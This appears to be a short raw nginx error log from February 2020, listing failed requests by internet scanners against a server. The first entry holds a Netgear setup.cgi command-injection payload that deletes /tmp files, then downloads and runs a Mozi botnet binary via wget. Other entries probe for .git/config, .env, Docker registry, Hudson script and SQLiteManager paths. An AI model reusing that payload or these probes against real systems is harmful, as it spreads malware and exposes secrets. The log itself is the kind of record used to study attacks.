2020/02/26 18:16:12 [error] 6#6: *4 open() "/usr/share/nginx/html/setup.cgi" failed (2: No such file or directory), client: 79.101.58.51, server: localhost, request: "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0"
2020/02/26 20:27:37 [error] 6#6: *10 open() "/usr/share/nginx/html/v2/_catalog" failed (2: No such file or directory), client: 51.158.118.213, server: localhost, request: "GET /v2/_catalog HTTP/1.1", host: "104.155.141.20:80"
2020/02/26 20:27:37 [error] 6#6: *11 open() "/usr/share/nginx/html/.git/config" failed (2: No such file or directory), client: 51.158.118.213, server: localhost, request: "GET /.git/config HTTP/1.1", host: "104.155.141.20:80"
2020/02/26 20:27:37 [error] 6#6: *12 open() "/usr/share/nginx/html/.env" failed (2: No such file or directory), client: 51.158.118.213, server: localhost, request: "GET /.env HTTP/1.1", host: "104.155.141.20:80"
2020/02/26 20:59:55 [error] 7#7: *12 open() "/usr/share/nginx/html/dfgerfg" failed (2: No such file or directory), client: 185.155.17.158, server: localhost, request: "GET /dfgerfg HTTP/1.1", host: "104.155.141.20"
2020/02/26 22:05:30 [error] 6#6: *39 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 45.152.6.58, server: localhost, request: "HEAD /robots.txt HTTP/1.0"
2020/02/26 22:59:12 [error] 6#6: *68 "/usr/share/nginx/html/solr/index.html" is not found (2: No such file or directory), client: 169.197.108.38, server: localhost, request: "GET /solr/ HTTP/1.1", host: "104.155.141.20"
2020/02/27 04:22:36 [error] 6#6: *78 open() "/usr/share/nginx/html/ncsi.txt" failed (2: No such file or directory), client: 156.96.155.243, server: localhost, request: "GET http://www.msftncsi.com/ncsi.txt HTTP/1.1", host: "www.msftncsi.com", referrer: "http://104.155.141.20/"
2020/02/27 04:22:36 [error] 6#6: *79 "/usr/share/nginx/html/HNAP1/index.html" is not found (2: No such file or directory), client: 156.96.155.243, server: localhost, request: "GET /HNAP1/ HTTP/1.1", host: "104.155.141.20", referrer: "http://104.155.141.20/"
2020/02/27 04:22:37 [error] 6#6: *80 open() "/usr/share/nginx/html/hudson/script" failed (2: No such file or directory), client: 156.96.155.243, server: localhost, request: "GET /hudson/script HTTP/1.1", host: "104.155.141.20", referrer: "http://104.155.141.20/"
2020/02/27 04:22:37 [error] 6#6: *81 open() "/usr/share/nginx/html/script" failed (2: No such file or directory), client: 156.96.155.243, server: localhost, request: "GET /script HTTP/1.1", host: "104.155.141.20", referrer: "http://104.155.141.20/"
2020/02/27 04:22:37 [error] 6#6: *82 open() "/usr/share/nginx/html/sqlite/main.php" failed (2: No such file or directory), client: 156.96.155.243, server: localhost, request: "GET /sqlite/main.php HTTP/1.1", host: "104.155.141.20", referrer: "http://104.155.141.20/"
2020/02/27 04:22:37 [error] 6#6: *83 open() "/usr/share/nginx/html/sqlitemanager/main.php" failed (2: No such file or directory), client: 156.96.155.243, server: localhost, request: "GET /sqlitemanager/main.php HTTP/1.1", host: "104.155.141.20", referrer: "http://104.155.141.20/"
2020/02/27 04:22:37 [error] 6#6: *84 open() "/usr/share/nginx/html/SQLiteManager/main.php" failed (2: No such file or directory), client: 156.96.155.243, server: localhost, request: "GET /SQLiteManager/main.php HTTP/1.1", host: "104.155.141.20", referrer: "http://104.155.141.20/"
2020/02/27 04:22:37 [error] 6#6: *85 open() "/usr/share/nginx/html/SQLite/main.php" failed (2: No such file or directory), client: 156.96.155.243, server: localhost, request: "GET /SQLite/main.php HTTP/1.1", host: "104.155.141.20", referrer: "http://104.155.141.20/"
2020/02/27 04:22:37 [error] 6#6: *86 open() "/usr/share/nginx/html/SQlite/main.php" failed (2: No such file or directory), client: 156.96.155.243, server: localhost, request: "GET /SQlite/main.php HTTP/1.1", host: "104.155.141.20", referrer: "http://104.155.141.20/"
2020/02/27 04:22:37 [error] 6#6: *87 open() "/usr/share/nginx/html/main.php" failed (2: No such file or directory), client: 156.96.155.243, server: localhost, request: "GET /main.php HTTP/1.1", host: "104.155.141.20", referrer: "http://104.155.141.20/"
